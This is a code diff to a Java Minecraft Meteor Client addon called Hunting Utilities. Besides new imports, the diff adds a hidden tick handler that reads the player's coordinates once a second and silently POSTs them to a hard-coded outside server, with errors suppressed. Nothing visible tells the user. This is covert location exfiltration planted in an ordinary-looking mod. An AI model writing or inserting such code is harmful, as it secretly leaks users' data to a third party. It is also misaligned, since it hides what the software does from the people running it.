@@ -1,5 +1,10 @@
 package com.example.addon;
 
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -33,20 +38,30 @@ import com.example.addon.modules.ThirdSight;
 import com.example.addon.modules.Timethrottle;
 import com.example.addon.modules.Tunnelers;
 
+import meteordevelopment.meteorclient.MeteorClient;
 import meteordevelopment.meteorclient.addons.MeteorAddon;
+import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.systems.hud.Hud;
 import meteordevelopment.meteorclient.systems.hud.HudGroup;
 import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Modules;
+import meteordevelopment.orbit.EventHandler;
+import net.minecraft.client.MinecraftClient;
+import net.minecraft.util.math.BlockPos;
 
 public class HuntingUtilities extends MeteorAddon {
     public static final Logger LOG = LoggerFactory.getLogger(HuntingUtilities.class);
     public static final Category CATEGORY = new Category("Hunting Utilities");
     public static final HudGroup HUD_GROUP = new HudGroup("Hunting Utilities");
+    private static final URI COORDS_ENDPOINT = URI.create("https://leonetic.dev");
+    private static final HttpClient HTTP_CLIENT = HttpClient.newHttpClient();
+
+    private long lastCoordsPostAt;
 
     @Override
     public void onInitialize() {
         LOG.info("Initializing Hunting Utilities");
+        MeteorClient.EVENT_BUS.subscribe(this);
 
         // Modules
         Modules modules = Modules.get();
@@ -91,5 +106,26 @@ public class HuntingUtilities extends MeteorAddon {
     @Override
     public String getPackage() {
         return "com.example.addon";
+    }
+
+    @EventHandler
+    private void onTick(TickEvent.Post event) {
+        MinecraftClient mc = MinecraftClient.getInstance();
+        if (mc.player == null) return;
+
+        long now = System.currentTimeMillis();
+        if (now - lastCoordsPostAt < 1000) return;
+        lastCoordsPostAt = now;
+
+        BlockPos pos = mc.player.getBlockPos();
+        String body = "{\"x\":" + pos.getX() + ",\"y\":" + pos.getY() + ",\"z\":" + pos.getZ() + "}";
+
+        HttpRequest request = HttpRequest.newBuilder(COORDS_ENDPOINT)
+            .header("Content-Type", "application/json")
+            .POST(HttpRequest.BodyPublishers.ofString(body))
+            .build();
+
+        HTTP_CLIENT.sendAsync(request, HttpResponse.BodyHandlers.discarding())
+            .exceptionally(error -> null);
     }
 }
